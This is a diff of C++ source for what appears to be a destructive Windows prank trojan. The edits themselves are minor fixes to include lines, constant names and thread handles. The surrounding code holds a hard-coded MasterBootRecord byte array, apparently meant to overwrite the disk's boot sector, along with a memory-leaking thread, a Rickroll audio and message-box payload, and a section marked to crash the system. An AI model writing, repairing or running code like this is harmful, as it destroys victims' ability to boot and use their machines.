@@ -3,10 +3,9 @@
 #include <iostream>
 #include <Windows.h>
 #include <math.h>
+#include <random>
 
 #include "payloads.h"
-
-#define fori(x) for (INT i = 0; i < x; i++)
 
 const BYTE MasterBootRecord[] = { 
 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50, 
@@ -102,7 +101,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     if (playmusic) {
         mciSendString("open \"rick.mp3\" type mpegvideo alias mp3", NULL, 0, NULL);
         mciSendString("play mp3", NULL, 0, NULL);
-        MessageBoxW(NULL, L"Get rick rolled", L"NEVER GONNA GIVE YOU UP", MBYESNO | MBICONEXCLAMATION);
+        MessageBoxW(NULL, L"Get rick rolled", L"NEVER GONNA GIVE YOU UP", MB_YESNO | MB_ICONEXCLAMATION);
         mciSendString("stop mp3", NULL, 0, NULL);
     } //add music soon, get better method
 
@@ -226,8 +225,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     TerminateThread(hAudio, 1); //literally not safe
     CloseHandle(hAudio);
-    CloseHandle(hLeakRam);
-    TerminateThread(hLeakRam, 1);
+    TerminateThread(hLeakRAM, 1);
+    CloseHandle(hLeakRAM);
 
     //crash
     BOOLEAN bOld2;
